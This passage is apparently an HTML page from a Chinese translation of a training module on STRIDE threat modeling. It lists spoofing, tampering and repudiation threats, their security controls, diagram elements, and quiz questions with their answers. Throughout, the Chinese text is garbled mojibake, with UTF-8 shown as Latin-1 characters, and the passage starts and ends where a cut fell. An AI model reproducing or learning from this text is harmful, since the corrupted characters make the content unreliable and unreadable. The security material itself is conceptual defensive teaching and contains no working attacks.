å°†èƒ½å¤Ÿï¼š</p><ul><li>è®¨è®ºå¨èƒå»ºæ¨¡æ¡†æ¶ä¸­çš„æ¯ä¸ªå¨èƒç±»åˆ«</li><li>äº†è§£æœ‰åŠ©äºé™ä½æˆ–æ¶ˆé™¤é£é™©çš„å®‰å…¨æ§åˆ¶</li></ul><div class="note success"><p>æ— å¿…å¤‡çŸ¥è¯†å³å¯å­¦ä¹  ï¼ˆ</p></div><h3 id="å¨èƒå»ºæ¨¡æ¡†æ¶"><a href="#å¨èƒå»ºæ¨¡æ¡†æ¶" class="headerlink" title="å¨èƒå»ºæ¨¡æ¡†æ¶"></a>å¨èƒå»ºæ¨¡æ¡†æ¶</h3><p>å¨èƒå»ºæ¨¡æ¡†æ¶æŸ¥çœ‹æ•°æ®æµå…³ç³»å›¾ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼ˆåŒ…æ‹¬å®ƒä»¬çš„äº¤äº’ï¼‰ã€‚ è¿™æœ‰åŠ©äºå‘ç°æ½œåœ¨å¨èƒå’Œæ‰¾åˆ°é™ä½æˆ–æ¶ˆé™¤é£é™©çš„æ–¹å¼ã€‚</p><h4 id="å¨èƒç±»åˆ«"><a href="#å¨èƒç±»åˆ«" class="headerlink" title="å¨èƒç±»åˆ«"></a>å¨èƒç±»åˆ«</h4><p>Microsoft å·¥ç¨‹å¸ˆä½¿ç”¨ STRIDE æ¡†æ¶ä¸­çš„å…­ä¸ªä¸»è¦å¨èƒç±»åˆ«æ¥å‘ç°å®‰å…¨è®¾è®¡é—®é¢˜ï¼š</p><table><thead><tr><th align="left">Category</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left">æ¬ºéª—</td><td align="left">å†’å……æŸäººæˆ–æŸç‰©</td></tr><tr><td align="left">ç¯¡æ”¹</td><td align="left">æœªç»æˆæƒæ›´æ”¹æ•°æ®</td></tr><tr><td align="left">å¦è®¤æ€§</td><td align="left">ä¸å®£ç§°å¯¹æ‰§è¡Œçš„æ“ä½œè´Ÿè´£</td></tr><tr><td align="left">ä¿¡æ¯æ³„éœ²</td><td align="left">æœªç»è®¸å¯æŸ¥çœ‹æ•°æ®</td></tr><tr><td align="left">æ‹’ç»æœåŠ¡</td><td align="left">ç³»ç»Ÿç¹å¿™</td></tr><tr><td align="left">æƒé™æå‡</td><td align="left">æ‹¥æœ‰æœ¬ä¸åº”è¯¥æ‹¥æœ‰çš„æƒé™</td></tr></tbody></table><h4 id="å®‰å…¨æ§åˆ¶ç±»åˆ«"><a href="#å®‰å…¨æ§åˆ¶ç±»åˆ«" class="headerlink" title="å®‰å…¨æ§åˆ¶ç±»åˆ«"></a>å®‰å…¨æ§åˆ¶ç±»åˆ«</h4><p>æ¯ä¸ªå¨èƒç±»åˆ«éƒ½ä¸å®‰å…¨æ§åˆ¶å…³è”ï¼Œä»¥å¸®åŠ©ä½ é™ä½æˆ–æ¶ˆé™¤é£é™©</p><table><thead><tr><th align="left">ç±»åˆ«</th><th align="left">å®‰å…¨æ§åˆ¶</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left">æ¬ºéª—</td><td align="left">èº«ä»½éªŒè¯</td><td align="left">å…¶èº«ä»½æ˜¯å¦å¦‚å…¶æ‰€è¿°</td></tr><tr><td align="left">ç¯¡æ”¹</td><td align="left">å®Œæ•´æ€§</td><td align="left">é˜²æ­¢æ¶æ„ä¿®æ”¹æ•°æ®</td></tr><tr><td align="left">å¦è®¤æ€§</td><td align="left">ä¸å¯å¦è®¤æ€§</td><td align="left">æ“ä½œä¸ç”¨æˆ·ç»‘å®š</td></tr><tr><td align="left">ä¿¡æ¯æ³„éœ²</td><td align="left">æœºå¯†æ€§</td><td align="left">ä¿æŠ¤æ•°æ®å…é­æ„å¤–æ³„éœ²</td></tr><tr><td align="left">æ‹’ç»æœåŠ¡</td><td align="left">å¯ç”¨æ€§</td><td align="left">ç³»ç»Ÿé€‚å½“å¤„ç†æ‰€æœ‰è¯·æ±‚</td></tr><tr><td align="left">ç‰¹æƒæå‡</td><td align="left">æˆæƒ</td><td align="left">ç”¨æˆ·æ‹¥æœ‰æ‰§è¡Œè¯·æ±‚çš„é€‚å½“æƒé™</td></tr></tbody></table><p>æˆ‘ä»¬åœ¨æ¥ä¸‹æ¥çš„å‡ ä¸ªå•å…ƒä¸­æ¥äº†è§£ä¸€ä¸‹å„ç§å¨èƒç±»åˆ«ã€‚</p><h3 id="æ¬ºéª—-å†’å……æŸäººæˆ–æŸç‰©"><a href="#æ¬ºéª—-å†’å……æŸäººæˆ–æŸç‰©" class="headerlink" title="æ¬ºéª— - å†’å……æŸäººæˆ–æŸç‰©"></a>æ¬ºéª— - å†’å……æŸäººæˆ–æŸç‰©</h3><p>å½“æ¶æ„äººå‘˜æˆ–ç¨‹åºæˆåŠŸåœ°å†’å……ç”¨æˆ·æˆ–ç³»ç»Ÿè¿›è¡Œæ¶æ„æ´»åŠ¨æ—¶ï¼Œå°±ä¼šå‘ç”Ÿæ¬ºéª—ã€‚</p><p>ç¤ºä¾‹åŒ…æ‹¬ï¼š</p><ul><li>æ”»å‡»è€…é€šè¿‡çœ‹ä¼¼åˆæ³•çš„å¸æˆ·å‘ç”¨æˆ·å‘é€ä¸€å°å¸¦æœ‰æ¶æ„é“¾æ¥å’Œé™„ä»¶çš„ç”µå­é‚®ä»¶ï¼Œä»¥æ•è·ç”¨æˆ·çš„å‡­æ®ã€æ•°æ®å’Œè®¾å¤‡è®¿é—®æƒé™</li><li>æ”»å‡»è€…æ¬ºéª— SSID å’Œ IP åœ°å€ï¼ŒåŒæ—¶ä½¿ç”¨å¼€æ”¾ä¸”åŸæœ¬ä¸å®‰å…¨çš„ TCP/IP åè®®å‘å—å®³è€…å‘é€æ¶æ„çš„æœ‰æ•ˆè´Ÿè½½</li></ul><h4 id="å¯èƒ½é¢ä¸´æ¬ºéª—æ”»å‡»é£é™©çš„å…ƒç´ å’Œäº¤äº’"><a href="#å¯èƒ½é¢ä¸´æ¬ºéª—æ”»å‡»é£é™©çš„å…ƒç´ å’Œäº¤äº’" class="headerlink" title="å¯èƒ½é¢ä¸´æ¬ºéª—æ”»å‡»é£é™©çš„å…ƒç´ å’Œäº¤äº’"></a>å¯èƒ½é¢ä¸´æ¬ºéª—æ”»å‡»é£é™©çš„å…ƒç´ å’Œäº¤äº’</h4><p>å…ƒç´ </p><table><thead><tr><th align="left">åç§°</th><th align="left">å½¢çŠ¶</th><th align="left">å®šä¹‰</th></tr></thead><tbody><tr><td align="left">è¿‡ç¨‹</td><td align="left"><img src="/img/thread-modeling/process50.png" class="lazyload" data-srcset="/img/thread-modeling/process50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process50"></td><td align="left">ä¿®æ”¹è¾“å…¥æˆ–å°†è¾“å…¥é‡å®šå‘åˆ°è¾“å‡ºçš„æ´»åŠ¨</td></tr><tr><td align="left">å¤–éƒ¨å®ä½“</td><td align="left"><img src="/img/thread-modeling/external-entity50.png" class="lazyload" data-srcset="/img/thread-modeling/external-entity50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="external-entity50"></td><td align="left">æ§åˆ¶æªæ–½ä¹‹å¤–çš„è¿‡ç¨‹ã€æ•°æ®å­˜å‚¨ï¼Œç”šè‡³å®Œå…¨æˆç†Ÿçš„åº”ç”¨ç¨‹åº</td></tr></tbody></table><p>äº¤äº’</p><table><thead><tr><th align="left">åç§°</th><th align="left">äº¤äº’</th><th align="left">å®šä¹‰</th></tr></thead><tbody><tr><td align="left">è¿‡ç¨‹ &lt;-&gt; è¿‡ç¨‹</td><td align="left"><img src="/img/thread-modeling/process-process.png" class="lazyload" data-srcset="/img/thread-modeling/process-process.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process-process"></td><td align="left">ä¸€ä¸ªä»»åŠ¡ä»ä»»åŠ¡æ¥æ”¶æ•°æ®æˆ–å‘ä»»åŠ¡å‘é€æ•°æ®</td></tr><tr><td align="left">è¿‡ç¨‹ &lt;-&gt; æ•°æ®å­˜å‚¨</td><td align="left"><img src="/img/thread-modeling/process-datastore.png" class="lazyload" data-srcset="/img/thread-modeling/process-datastore.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process-datastore"></td><td align="left">ä¸€ä¸ªä»»åŠ¡å‘æ•°æ®å­˜å‚¨å‘é€æ•°æ®æˆ–ä»æ•°æ®å­˜å‚¨æ¥æ”¶æ•°æ®</td></tr><tr><td align="left">è¿‡ç¨‹ &lt;-&gt; å¤–éƒ¨å®ä½“</td><td align="left"><img src="/img/thread-modeling/process-externalentity.png" class="lazyload" data-srcset="/img/thread-modeling/process-externalentity.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process-externalentity"></td><td align="left">ä¸€ä¸ªä»»åŠ¡å‘å¤–éƒ¨å®ä½“å‘é€æ•°æ®æˆ–ä»å¤–éƒ¨å®ä½“æ¥æ”¶æ•°æ®</td></tr></tbody></table><h4 id="å¦‚ä½•é˜²æ­¢æ¬ºéª—æ”»å‡»"><a href="#å¦‚ä½•é˜²æ­¢æ¬ºéª—æ”»å‡»" class="headerlink" title="å¦‚ä½•é˜²æ­¢æ¬ºéª—æ”»å‡»"></a>å¦‚ä½•é˜²æ­¢æ¬ºéª—æ”»å‡»</h4><p>èº«ä»½éªŒè¯éªŒè¯äº†ç”¨æˆ·å’Œç³»ç»Ÿçš„èº«ä»½æ˜¯å¦å±å®ã€‚</p><p>ç¤ºä¾‹åŒ…æ‹¬ï¼š</p><ul><li>å‘é€å’Œæ¥æ”¶ä½¿ç”¨æ•°å­—ç­¾åè¿›è¡Œç­¾åçš„æ¶ˆæ¯ï¼Œä»¥éªŒè¯æ¥æºå¹¶ç¡®ä¿æ¶ˆæ¯å®Œæ•´æ€§</li><li>ä½¿ç”¨ SSL/TLS ä¿æŠ¤æ•°æ®ä¼ è¾“ï¼Œä»¥åŠ å¯†ä¿¡æ¯æºå’Œç›®æ ‡ä¹‹é—´çš„æµé‡</li><li>ä½¿ç”¨å…·æœ‰æ—¶æ•ˆæœ‰é™çš„ä»¤ç‰Œã€å¯†ç æˆ–å¤šé‡èº«ä»½éªŒè¯çš„å”¯ä¸€å‡­æ®æ¥å¸®åŠ©ä¿æŠ¤ç”¨æˆ·ã€ç®¡ç†å‘˜å’ŒæœåŠ¡å¸æˆ·</li></ul><h4 id="ç”¨äºé™ä½æˆ–æ¶ˆé™¤é£é™©çš„å¸¸ç”¨å®‰å…¨æ§åˆ¶"><a href="#ç”¨äºé™ä½æˆ–æ¶ˆé™¤é£é™©çš„å¸¸ç”¨å®‰å…¨æ§åˆ¶" class="headerlink" title="ç”¨äºé™ä½æˆ–æ¶ˆé™¤é£é™©çš„å¸¸ç”¨å®‰å…¨æ§åˆ¶"></a>ç”¨äºé™ä½æˆ–æ¶ˆé™¤é£é™©çš„å¸¸ç”¨å®‰å…¨æ§åˆ¶</h4><p>å¯¹äºæ•°æ®ï¼š</p><ul><li>å“ˆå¸Œ</li><li>æ¶ˆæ¯éªŒè¯ç </li><li>æ•°å­—ç­¾å</li></ul><p>å¯¹äºç³»ç»Ÿï¼š</p><ul><li>ç”¨æˆ·èº«ä»½éªŒè¯</li><li>Cookie èº«ä»½éªŒè¯</li><li>Kerberos</li><li>SSL/TLS</li><li>è¯ä¹¦</li><li>IPSec</li><li>æ•°å­—ç­¾åçš„æ•°æ®åŒ…</li></ul><div class="note green"><p>æ¨èé—®é¢˜ï¼šæ˜¯å¦å·²éªŒè¯é€šä¿¡åŒæ–¹çš„èº«ä»½ï¼Ÿ</p></div><h4 id="çŸ¥è¯†æ£€æŸ¥-13"><a href="#çŸ¥è¯†æ£€æŸ¥-13" class="headerlink" title="çŸ¥è¯†æ£€æŸ¥"></a>çŸ¥è¯†æ£€æŸ¥</h4><ol><li>å“ªä¸€æ¡é™ˆè¿°æè¿°äº†é’ˆå¯¹æ¬ºéª—çš„å®‰å…¨æ§åˆ¶ï¼Ÿ</li></ol><div class='checkbox'><input type="radio" />            <p>A. å‘é€æ–¹å¯¹æ¶ˆæ¯è¿›è¡Œæ•°å­—ç­¾åï¼Œä»¥ä¾¿æ¥æ”¶æ–¹äº†è§£æ¶ˆæ¯çš„æ¥æºã€‚</p>            </div><div class='checkbox'><input type="radio" />            <p>B. ç³»ç»Ÿè®°å½•æ‰€æœ‰æ“ä½œå’Œç”¨æˆ·ï¼Œæ˜ç¡®æ¯ä¸ªäººçš„è´£ä»»ã€‚</p>            </div><div class='checkbox'><input type="radio" />            <p>C. ç³»ç»Ÿä¸ºè®¿é—®æ§åˆ¶åˆ—è¡¨ä¸­åˆ—å‡ºçš„ç”¨æˆ·æˆäºˆç®¡ç†è®¿é—®æƒé™ã€‚</p>            </div><p>å‚è€ƒç­”æ¡ˆï¼š<psw>== A ==</psw></p><p>è§£é‡Šï¼š<psw>A. æ­¤æ¶ˆæ¯é€‚ç”¨äºæ¬ºéª—ã€‚B. è¿™æ¡é™ˆè¿°é€‚ç”¨äºå¦è®¤æ€§ã€‚C. è¿™æ¡é™ˆè¿°é€‚ç”¨äºç¯¡æ”¹ã€ä¿¡æ¯æ³„éœ²ã€æ‹’ç»æœåŠ¡å’Œæƒé™æå‡ã€‚</psw></p><h3 id="ç¯¡æ”¹-æœªç»æˆæƒæ›´æ”¹æ•°æ®"><a href="#ç¯¡æ”¹-æœªç»æˆæƒæ›´æ”¹æ•°æ®" class="headerlink" title="ç¯¡æ”¹ - æœªç»æˆæƒæ›´æ”¹æ•°æ®"></a>ç¯¡æ”¹ - æœªç»æˆæƒæ›´æ”¹æ•°æ®</h3><p>å½“æ¶æ„æ”»å‡»è€…æœªç»æˆæƒåœ¨ç³»ç»Ÿä¸­è¯»å–ã€ä¿®æ”¹ã€åˆ é™¤æˆ–æ’å…¥æ•°æ®æ—¶ï¼Œå°±ä¼šå‘ç”Ÿç¯¡æ”¹ã€‚</p><p>ç¤ºä¾‹åŒ…æ‹¬ï¼š</p><ul><li>ä¿®æ”¹ä¸´æ—¶å­˜å‚¨åœ¨ç¼“å­˜ä¸­ã€é€šè¿‡ç½‘ç»œå‘é€æˆ–æ°¸ä¹…å­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„æ•°æ®ä»¥ç ´åæ•°æ®å®Œæ•´æ€§</li><li>å°†æ¶æ„æœ‰æ•ˆè´Ÿè½½æ’å…¥æµè§ˆå™¨ç¼“å­˜ä¸­ï¼Œä»¥å¯¼è‡´è¿›ç¨‹å’Œæ•°æ®å­˜å‚¨ä¸­çš„è¡Œä¸ºå¼‚å¸¸</li><li>é€šè¿‡å¼± API è°ƒç”¨å¤„ç†ä¿®æ”¹å†…å­˜ï¼Œå¯¼è‡´å´©æºƒå’Œæ³„æ¼æ•æ„Ÿé”™è¯¯æ¶ˆæ¯</li><li>å°†æ•°æ®é‡å®šå‘åˆ°è¢«å…¥ä¾µçš„è®¡ç®—æœºä»¥æ¥ç®¡ç³»ç»Ÿ</li><li>è¯±ä½¿ç”¨æˆ·è¿æ¥ç½‘ç»œæˆ–ä¸‹è½½æ–‡ä»¶ï¼Œä»è€Œæˆäºˆä»–ä»¬æµé‡å’Œè®¾å¤‡è®¿é—®æƒé™ï¼ˆä¸æ¬ºéª—ç»“åˆä½¿ç”¨ï¼‰</li></ul><h4 id="å¯èƒ½é¢ä¸´ç¯¡æ”¹æ”»å‡»é£é™©çš„å…ƒç´ å’Œäº¤äº’"><a href="#å¯èƒ½é¢ä¸´ç¯¡æ”¹æ”»å‡»é£é™©çš„å…ƒç´ å’Œäº¤äº’" class="headerlink" title="å¯èƒ½é¢ä¸´ç¯¡æ”¹æ”»å‡»é£é™©çš„å…ƒç´ å’Œäº¤äº’"></a>å¯èƒ½é¢ä¸´ç¯¡æ”¹æ”»å‡»é£é™©çš„å…ƒç´ å’Œäº¤äº’</h4><p>å…ƒç´ </p><table><thead><tr><th align="left">åç§°</th><th align="left">å½¢çŠ¶</th><th align="left">å®šä¹‰</th></tr></thead><tbody><tr><td align="left">è¿‡ç¨‹</td><td align="left"><img src="/img/thread-modeling/process50.png" class="lazyload" data-srcset="/img/thread-modeling/process50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process50"></td><td align="left">ä¿®æ”¹è¾“å…¥æˆ–å°†è¾“å…¥é‡å®šå‘åˆ°è¾“å‡ºçš„æ´»åŠ¨</td></tr><tr><td align="left">æ•°æ®å­˜å‚¨</td><td align="left"><img src="/img/thread-modeling/data-store50.png" class="lazyload" data-srcset="/img/thread-modeling/data-store50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="data-store50"></td><td align="left">æ°¸ä¹…æˆ–ä¸´æ—¶çš„æ•°æ®å­˜å‚¨</td></tr><tr><td align="left">æ•°æ®æµ</td><td align="left"><img src="/img/thread-modeling/data-flow50.png" class="lazyload" data-srcset="/img/thread-modeling/data-flow50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="data-flow50"></td><td align="left">å…ƒç´ ä¹‹é—´çš„æ•°æ®ç§»åŠ¨</td></tr></tbody></table><p>äº¤äº’</p><table><thead><tr><th>åç§°</th><th align="left">äº¤äº’</th><th align="left">å®šä¹‰</th></tr></thead><tbody><tr><td>è¿‡ç¨‹ &lt;-&gt; æ•°æ®å­˜å‚¨</td><td align="left"><img src="/img/thread-modeling/process-datastore.png" class="lazyload" data-srcset="/img/thread-modeling/process-datastore.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process-datastore"></td><td align="left">ä¸€ä¸ªä»»åŠ¡å‘æ•°æ®å­˜å‚¨å‘é€æ•°æ®æˆ–ä»æ•°æ®å­˜å‚¨æ¥æ”¶æ•°æ®</td></tr><tr><td>æ•°æ®æµ &lt;-&gt; ä¿¡ä»»è¾¹ç•Œ</td><td align="left"><img src="/img/thread-modeling/flow-trustboundary-7599331.png" class="lazyload" data-srcset="/img/thread-modeling/flow-trustboundary-7599331.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flow-trustboundary"></td><td align="left">é€šè¿‡ Internet å°†æ•°æ®ä»å—ä¿¡ä»»çš„ç¯å¢ƒä¼ è¾“ç»™æŸäººï¼ˆåä¹‹äº¦ç„¶ï¼‰</td></tr></tbody></table><h4 id="å¦‚ä½•é˜²æ­¢ç¯¡æ”¹"><a href="#å¦‚ä½•é˜²æ­¢ç¯¡æ”¹" class="headerlink" title="å¦‚ä½•é˜²æ­¢ç¯¡æ”¹"></a>å¦‚ä½•é˜²æ­¢ç¯¡æ”¹</h4><p>å®Œæ•´æ€§é˜²æ­¢æ¶æ„ä¿®æ”¹æ•°æ®ã€‚ ç¤ºä¾‹åŒ…æ‹¬ï¼š</p><ul><li>éªŒè¯è¾“å…¥ä»¥é˜²æ­¢å¤„ç†æ¶æ„æœ‰æ•ˆè´Ÿè½½å’Œé”™è¯¯å¤„ç†æ„å¤–è¡Œä¸º</li><li>ä½¿ç”¨æ•°å­—ç­¾åå¯¹æ¶ˆæ¯è¿›è¡Œç­¾åï¼Œä»¥ç¡®ä¿æ¶ˆæ¯ä¸è¢«ç¯¡æ”¹</li><li>ä½¿ç”¨è®¿é—®æ§åˆ¶åˆ—è¡¨åº”ç”¨æƒé™</li><li>ä½¿ç”¨ SSL/TLS ä¿æŠ¤ä¼ è¾“</li><li>åˆ›å»º IPSec éš§é“ï¼Œä»¥ä¿æŠ¤ç»ˆç»“ç‚¹ä¹‹é—´çš„é€šä¿¡</li></ul><h4 id="ç”¨äºé™ä½æˆ–æ¶ˆé™¤é£é™©çš„å¸¸ç”¨å®‰å…¨æ§åˆ¶-1"><a href="#ç”¨äºé™ä½æˆ–æ¶ˆé™¤é£é™©çš„å¸¸ç”¨å®‰å…¨æ§åˆ¶-1" class="headerlink" title="ç”¨äºé™ä½æˆ–æ¶ˆé™¤é£é™©çš„å¸¸ç”¨å®‰å…¨æ§åˆ¶"></a>ç”¨äºé™ä½æˆ–æ¶ˆé™¤é£é™©çš„å¸¸ç”¨å®‰å…¨æ§åˆ¶</h4><ul><li>æ“ä½œç³»ç»Ÿå®Œæ•´æ€§æ§åˆ¶</li><li>è®¿é—®æ§åˆ¶åˆ—è¡¨ (ACL)</li><li>æ•°å­—ç­¾å</li><li>æ¶ˆæ¯éªŒè¯ç </li></ul><div class="note green"><p>æ¨èé—®é¢˜ï¼šå¦‚ä½•å¾—çŸ¥æŸäººæ— æ³•æ›´æ”¹ä¼ è¾“ä¸­çš„æ•°æ®æˆ–é™æ€æ•°æ®ï¼Ÿ</p></div><h4 id="çŸ¥è¯†æ£€æŸ¥-14"><a href="#çŸ¥è¯†æ£€æŸ¥-14" class="headerlink" title="çŸ¥è¯†æ£€æŸ¥"></a>çŸ¥è¯†æ£€æŸ¥</h4><ol><li>å“ªä¸€æ¡é™ˆè¿°æè¿°äº†é’ˆå¯¹ç¯¡æ”¹çš„å®‰å…¨æ§åˆ¶ï¼Ÿ</li></ol><div class='checkbox'><input type="radio" />            <p>A. å‘ä»¶äººå¯¹ç”µå­é‚®ä»¶é™„ä»¶è¿›è¡ŒåŠ å¯†ï¼Œä»¥ä¾¿è®©æ”¶ä»¶äººçŸ¥é“ç”µå­é‚®ä»¶ç”±ä½•äººæ‰€å‘ã€‚</p>            </div><div class='checkbox'><input type="radio" />            <p>B. ç³»ç»Ÿè®°å½•æ‰€æœ‰æ“ä½œå’Œç”¨æˆ·ï¼Œæ˜ç¡®æ¯ä¸ªäººçš„è´£ä»»ã€‚</p>            </div><div class='checkbox'><input type="radio" />            <p>C. ç³»ç»Ÿä¸ºè®¿é—®æ§åˆ¶åˆ—è¡¨ä¸­åˆ—å‡ºçš„ç”¨æˆ·æˆäºˆç®¡ç†è®¿é—®æƒé™ã€‚</p>            </div><p>å‚è€ƒç­”æ¡ˆï¼š<psw>== C ==</psw></p><p>è§£é‡Šï¼š<psw>A. åŠ å¯†é™„ä»¶æ˜¯ä¸å¤Ÿçš„ã€‚ å¯¹æ¶ˆæ¯è¿›è¡Œæ•°å­—ç­¾åï¼Œä»¥ç¡®ä¿ä¸ä¼šå‘ç”Ÿç¯¡æ”¹ã€‚B. è¿™æ¡é™ˆè¿°é€‚ç”¨äºå¦è®¤æ€§ã€‚C. è¿™æ¡é™ˆè¿°é€‚ç”¨äºç¯¡æ”¹ã€ä¿¡æ¯æ³„éœ²ã€æ‹’ç»æœåŠ¡å’Œæƒé™æå‡ã€‚</psw></p><h3 id="å¦è®¤æ€§-ä¸å®£ç§°å¯¹æ‰§è¡Œçš„æ“ä½œè´Ÿè´£"><a href="#å¦è®¤æ€§-ä¸å®£ç§°å¯¹æ‰§è¡Œçš„æ“ä½œè´Ÿè´£" class="headerlink" title="å¦è®¤æ€§ - ä¸å®£ç§°å¯¹æ‰§è¡Œçš„æ“ä½œè´Ÿè´£"></a>å¦è®¤æ€§ - ä¸å®£ç§°å¯¹æ‰§è¡Œçš„æ“ä½œè´Ÿè´£</h3><p>å½“æœ‰äººå‡ºäºæ¶æ„æˆ–æ— æ„é‡‡å–æŸä¸ªæ“ä½œï¼Œä½†å£°æ˜å…¶ä»–æ“ä½œæ—¶ï¼Œå°±ä¼šå‘ç”Ÿå¦è®¤æ€§ã€‚</p><p>ç¤ºä¾‹åŒ…æ‹¬ï¼š</p><ul><li>æ‹’ç»ä¿®æ”¹åŒ…å«æ•æ„Ÿæ“ä½œçš„æ—¥å¿—</li><li>ä½¿ç”¨å…¶ä»–äººçš„å¸æˆ·ä»¥é¿å…è¢«æŠ“</li><li>å£°ç§°æ²¡æœ‰åˆ é™¤æ•°æ®åº“è®°å½•</li></ul><div class="note info"><p>ç³»ç»Ÿæ—¥å¿—æ˜¯æ”»å‡»è€…çš„é‡‘çŸ¿ï¼Œä¸ä»…å¯ç”¨äºæ“çºµï¼Œè€Œä¸”å¯ç”¨äºæ”¶é›†æœ‰å…³ç”¨æˆ·ã€ç¯å¢ƒå’Œå¼±ç‚¹çš„æ•°æ®ã€‚</p></div><h4 id="å¯èƒ½é¢ä¸´å¦è®¤æ€§æ”»å‡»é£é™©çš„å…ƒç´ å’Œäº¤äº’"><a href="#å¯èƒ½é¢ä¸´å¦è®¤æ€§æ”»å‡»é£é™©çš„å…ƒç´ å’Œäº¤äº’" class="headerlink" title="å¯èƒ½é¢ä¸´å¦è®¤æ€§æ”»å‡»é£é™©çš„å…ƒç´ å’Œäº¤äº’"></a>å¯èƒ½é¢ä¸´å¦è®¤æ€§æ”»å‡»é£é™©çš„å…ƒç´ å’Œäº¤äº’</h4><p>å…ƒç´ </p><table><thead><tr><th align="left">åç§°</th><th align="left">å½¢çŠ¶</th><th align="left">å®šä¹‰</th></tr></thead><tbody><tr><td align="left">è¿‡ç¨‹</td><td align="left"><img src="/img/thread-modeling/process50.png" class="lazyload" data-srcset="/img/thread-modeling/process50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process50"></td><td align="left">ä¿®æ”¹è¾“å…¥æˆ–å°†è¾“å…¥é‡å®šå‘åˆ°è¾“å‡ºçš„æ´»åŠ¨</td></tr><tr><td align="left">å¤–éƒ¨å®ä½“</td><td align="left"><img src="/img/thread-modeling/external-entity50.png" class="lazyload" data-srcset="/img/thread-modeling/external-entity50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="external-entity50"></td><td align="left">æ§åˆ¶æªæ–½ä¹‹å¤–çš„è¿‡ç¨‹ã€æ•°æ®å­˜å‚¨ï¼Œç”šè‡³å®Œå…¨æˆç†Ÿçš„åº”ç”¨ç¨‹åº</td></tr><tr><td align="left">æ•°æ®å­˜å‚¨</td><td align="left"><img 